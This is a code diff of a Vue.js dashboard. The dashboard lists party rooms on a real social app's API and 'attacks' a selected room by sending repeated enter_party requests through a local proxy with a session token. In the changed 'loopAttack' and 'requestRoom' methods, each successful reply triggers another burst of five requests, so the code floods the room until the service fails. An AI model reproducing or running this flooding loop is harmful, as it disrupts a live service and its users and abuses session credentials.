@@ -33,7 +33,7 @@
             </template>
             <template v-slot:cell(actions)="row">
               <b-overlay
-                :show="busy"
+                :show="row.item.active"
                 rounded
                 opacity="0.6"
                 spinner-small
@@ -52,7 +52,7 @@
           <div class="d-block text-center">
             <h3>Done!</h3>
           </div>
-          <b-button class="mt-3" block @click="$bvModal.hide('bv-modal-example')">Close Me</b-button>
+          <b-button class="mt-3" block @click="hideModal()">Close Me</b-button>
         </b-modal>
     </b-container>
   </div>
@@ -70,7 +70,7 @@ export default {
     this.getRoomList();
     setInterval(() => {
       this.getRoomList();
-    }, 60000)
+    }, 180000)
   },
   watch: {
   },
@@ -81,6 +81,7 @@ export default {
     return {
       busy: false,
       node: 0,
+      modalShow: false,
       timeout: null,
       isBusy: false,
       objAttacking: [],
@@ -119,13 +120,18 @@ export default {
         { key: 'actions', label: 'Actions' }
       ],
       roomList: [],
-      key: '1284221953389299865',
+      key: '',
       proxy: 'http://localhost:3000/pipe/',
       state: false,
       roomId: '',
     }
   },
   methods: {
+    hideModal() {
+      this.modalShow = false;
+      this.$bvModal.hide('bv-modal-example')
+      this.getRoomList();
+    },
     clearTimeout() {
       if (this.timeout) {
         clearTimeout(this.timeout)
@@ -151,40 +157,42 @@ export default {
       .then(blob => blob.json())
       .then(data => {
         this.roomList = data.data;
+        this.roomList = this.roomList.map(obj=> ({ ...obj, active: false }))
         this.isBusy = false;
       })
       .catch(e => {
-        console.log(e);
         this.isBusy = false;
         return e;
       });
     },
     async loopAttack(roomId) {
-      this.busy = true
+      roomId.active = true;
       this.stateAttacking = 'Process';
       this.objAttacking.push(roomId);
-      this.requestRoom(roomId.id);
-      this.requestRoom(roomId.id);
-      this.requestRoom(roomId.id);
-      this.requestRoom(roomId.id);
-      this.requestRoom(roomId.id);
+      this.requestRoom(roomId);
+      this.requestRoom(roomId);
+      this.requestRoom(roomId);
+      this.requestRoom(roomId);
+      this.requestRoom(roomId);
     },
     requestRoom(roomId) {
       var self = this;
       var proxyUrl = this.proxy;
-      var targetUrl = "http://www.litatom.com/api/sns/v1/lit/user/enter_party?party_id="+roomId+"&loc=US&sid=session."+this.key+"&version=3.7.1&uuid=1944739c55bbc885";
+      var targetUrl = "http://www.litatom.com/api/sns/v1/lit/user/enter_party?party_id="+roomId.id+"&loc=US&sid=session."+this.key+"&version=3.7.1&uuid=1944739c55bbc885";
       fetch(proxyUrl + targetUrl)
       .then(blob => blob.json())
       .then(data => {
         if (data.success == true) {
           self.node++;
-          self.requestRoom(roomId);
+          self.loopAttack(roomId);
         } else {
           self.node = 0;
           self.stateAttacking = 'DIE'
-          self.$bvModal.show('bv-modal-example');
-          self.busy = false
-          self.getRoomList();
+          if (self.modalShow == false) {
+            self.$bvModal.show('bv-modal-example');
+          }
+          self.modalShow = true
+          roomId.active = false
         }
       })
       .catch(e => {
